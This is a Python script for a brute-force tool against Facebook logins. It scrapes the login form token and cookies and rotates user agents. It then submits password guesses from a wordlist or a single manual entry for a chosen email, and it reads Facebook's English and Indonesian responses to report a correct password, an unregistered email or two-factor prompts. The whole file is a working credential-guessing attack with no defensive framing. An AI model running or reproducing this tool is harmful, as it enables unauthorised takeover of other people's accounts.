import requests, sys, time, random, re
from bs4 import BeautifulSoup
from app import logtime

class Facebook:
    # attribute
    url = 'https://web.facebook.com/login.php'
    headers = {
	    'User-Agent':random.choice([
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
        ]),
    }
    payload = {}
    cookies = {}
    typeExec = ''
    account = {
        'email': '',
        'password': ''
    }
    # init
    def __init__(self, email, execute, customfile, colored, password = ''):
        self.execute = execute
        self.account['email'] = email
        self.account['password'] = password
        self.customfile = customfile
        self.colored = colored
        print(logtime(), self.colored('Start Facebook Bruteforce', 'blue'))
        dot = 0
        onwhile = True
        while onwhile:
            dot += 5
            print(logtime(), self.colored(' ' * dot, 'blue', 'on_white') + f' {dot}%', end = "\r")
            time.sleep(0.1)
            if(dot == 100): onwhile = False
        print('')
        print(logtime(), 'Checking Email...')
        if re.search('^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$', email) is None:
            print(logtime(), colored('Email Not Valid. Check The Email, must be email@servermail.abc', 'red'))
            sys.exit()
        else:
            print(logtime(), colored('Email Is Valid', 'green'))
        self.run()

    def CreateForm(self):
        form = dict()
        self.cookies = {
            'fr' : '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'
        }
        print(logtime(), 'Using ' +self.headers['User-Agent'])
        data = requests.get(self.url,headers = self.headers)
        # 200
        if data.status_code == 200:
            for i in data.cookies:
                self.cookies[i.name] = i.value
            data = BeautifulSoup(data.text,'html.parser').form
            if data.input['name'] == 'lsd':
                form['lsd'] = data.input['value']
            return (form,self.cookies)
        # 404/500/403
        else:
            sys.exit()

    def commit(self, email, password):
        self.payload['email']   = email
        self.payload['pass']    = password
        ReqPost = requests.post(self.url, data = self.payload, cookies = self.cookies, headers = self.headers)
        # print(ReqPost.text)
        if 'Aktivitas terbaru mungkin mempengaruhi keamanan akun Anda' in ReqPost.text or 'Recent activity might affect the security of your account' in ReqPost.text or 'Harap Konfirmasikan Identitas Anda' in ReqPost.text:
            print(self.colored(f'Password is {password}', 'blue'), end="\r")
            sys.exit()
            return True
        if 'Email yang Anda masukkan tidak cocok dengan akun mana saja. Buat sebuah akun.' in ReqPost.text or "The email address that you've entered doesn't match any account. Sign up for an account." in ReqPost.text:
            print( "Email Not Registry.", end="\r")
            sys.exit()
            return True
        if 'Ada masalah pada permintaan ini. Kami berusaha untuk menyelesaikannya dengan segera.' in ReqPost.text:
            print(self.colored("Account Can't Be Process In Backend.", 'red'), end="\r")
            return False
        if  "You've entered an old password" in ReqPost.text:
            print( " Old Password.")
        if "Kami akan memandu Anda melalui beberapa langkah untuk membuka kunci akun Anda." in ReqPost.text:
            print(self.colored("Password Correct But Have Two Verification", 'blue'), end="\r")
        if "We won’t support this browser soon. For a better experience, we recommend using another browser." in ReqPost.text:
            print(self.colored("User Agent Not Support For Now. Please Try Again...", 'yellow'), end="\r")
            sys.exit()
        else:
            print(self.colored("Could Not Resolve", 'red'), end="\r")
            return False

    def run(self):
        self.CreateForm()
        # using txt file
        if(self.execute == 'auto'):
            file = ''
            fileb = ''
            def success():
                sumfile = len(list(fileb))
                i = 0
                for data in file:
                    i += 1
                    print(logtime(), "({i}/{sumfile})".format(i = str(i), sumfile=sumfile), end="-> ")
                    self.commit(self.account['email'], data)

            if self.customfile:
                try:
                    file = open(self.customfile, 'r')
                    fileb = open(self.customfile, 'rb')
                except:
                    print(logtime(), self.colored(f"{self.customfile} not founds. Create wordlist now", 'red'))
                finally:
                    success()

            else:
                try:
                    file = open('passwords.txt', 'r')
                    fileb = open('passwords.txt', 'rb')
                except:
                    print(logtime(), self.colored("passwords.txt not founds. Create wordlist now", 'red'))
                finally:
                    success()
                    
        # using password
        if(self.execute == 'manual'):
            email = self.account['email']
            password = self.account['password']
            if len(password) != 0 and len(password) >= 6:
                print(logtime(), "({i})_{password}".format(i = str(0), password = password), end="-> ")
                self.commit(email, password)
            else:
                print('Password Must Be Length More 6')
                sys.exit()